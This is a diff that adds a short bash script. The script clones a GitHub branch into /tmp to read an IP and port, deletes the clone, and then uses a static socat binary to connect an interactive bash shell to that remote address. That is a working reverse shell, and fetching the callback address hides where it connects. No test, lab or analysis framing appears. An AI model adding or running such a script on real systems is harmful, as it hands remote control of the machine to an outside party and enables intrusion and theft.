@@ -1,0 +1,7 @@
+#!/bin/bash
+cd /tmp
+/usr/bin/git clone -b addr --single-branch https://github.com/yuvalavra/ngrok.git
+remote_serv="$(cat /tmp/ngrok/ip_port)"
+rm -rf /tmp/ngrok
+
+/usr/local/sbin/static_socat "exec:bash -li,pty,stderr,setsid,sigint,sane" "tcp:$remote_serv"
